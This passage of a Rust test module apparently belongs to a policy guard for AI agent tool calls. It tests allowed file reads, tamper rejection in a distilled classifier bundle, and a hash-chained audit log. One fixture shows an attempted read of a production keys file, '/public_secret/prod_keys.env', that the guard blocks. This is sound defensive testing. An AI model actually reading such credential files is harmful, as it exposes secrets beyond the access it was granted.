        let good_read = r#"{"tool_name":"Read","tool_input":{"file_path":"/repo/src/main.rs"}}"#;
        let (t3, p3, hp3, r3) = parse_hook_payload(good_read);
        assert!(evaluate_tool_call(&policy, &t3, &p3, hp3, &r3).unwrap().allowed);
    }

    #[test]
    fn distill_query_and_tamper_rejection_end_to_end() {
        let jsonl = "\
{\"input\":\"outage: db primary down\",\"output\":\"urgent\"}\n\
{\"input\":\"outage: eu edge 503\",\"output\":\"urgent\"}\n\
{\"input\":\"invoice #102 double charged\",\"output\":\"billing\"}\n\
{\"input\":\"invoice #889 refund needed\",\"output\":\"billing\"}\n\
{\"input\":\"how do i export csv?\",\"output\":\"general\"}\n\
{\"input\":\"dark mode settings question\",\"output\":\"general\"}\n";

        let (bundle, _, count) =
            distill_jsonl_to_bundle(jsonl, "support", SynthMode::HybridGuarded { min_support: 2 })
                .unwrap();
        assert_eq!(count, 6);
        let wire = bundle.encode_text();

        // known pattern hits offline at 0 tokens
        match query_bundle_wire(&wire, "outage: checkout 503").unwrap() {
            QueryResult::Hit(lbl, _) => assert_eq!(lbl, "urgent"),
            other => panic!("expected offline hit, got {:?}", other),
        }
        // unseen pattern safely escalates to llm
        match query_bundle_wire(&wire, "enterprise partnership inquiry").unwrap() {
            QueryResult::Escalate(_) => {}
            other => panic!("expected escalate, got {:?}", other),
        }
        // 1-byte tampered bundle is cryptographically rejected
        let tampered = wire.replace("urgent", "pwned!");
        assert!(query_bundle_wire(&tampered, "outage: checkout 503").is_err());
    }

    #[test]
    fn merkle_audit_chain_detects_tampering() {
        let mut chain = String::new();
        let mut prev = String::from(GENESIS_HASH);
        let v1 = GuardVerdict {
            allowed: true,
            tool: "fs_read".into(),
            target: "/public/readme.md".into(),
            outcome_sexpr: "(ok (allowed \"fs_read\" \"/public/readme.md\"))".into(),
            merkle_hash: "aaaa1111bbbb".into(),
            fuel_used: 22,
        };
        let h1 = compute_audit_link(&prev, &v1);
        chain.push_str(&format!(
            "{{\"prev_hash\":{},\"entry_hash\":{},\"decision\":\"allow\",\"tool\":\"fs_read\",\"target\":\"/public/readme.md\",\"merkle\":\"aaaa1111bbbb\"}}\n",
            json_esc(&prev),
            json_esc(&h1)
        ));
        prev = h1;

        let v2 = GuardVerdict {
            allowed: false,
            tool: "fs_read".into(),
            target: "/public_secret/prod_keys.env".into(),
            outcome_sexpr: "(blocked denied_pattern \"/public_secret/prod_keys.env\")".into(),
            merkle_hash: "b9bc787f1e37".into(),
            fuel_used: 29,
        };
        let h2 = compute_audit_link(&prev, &v2);
        chain.push_str(&format!(
            "{{\"prev_hash\":{},\"entry_hash\":{},\"decision\":\"block\",\"tool\":\"fs_read\",\"target\":\"/public_secret/prod_keys.env\",\"merkle\":\"b9bc787f1e37\"}}\n",
            json_esc(&prev),
            json_esc(&h2)
        ));

        let (cnt, blk, _) = verify_audit_chain_text(&chain).unwrap();
        assert_eq!(cnt, 2);
        assert_eq!(blk, 1);

        // tampering with decision breaks the chain
        let hacked = chain.replace("\"decision\":\"block\"", "\"decision\":\"allow\"");
        assert!(verify_audit_chain_text(&hacked).is_err());
    }
}
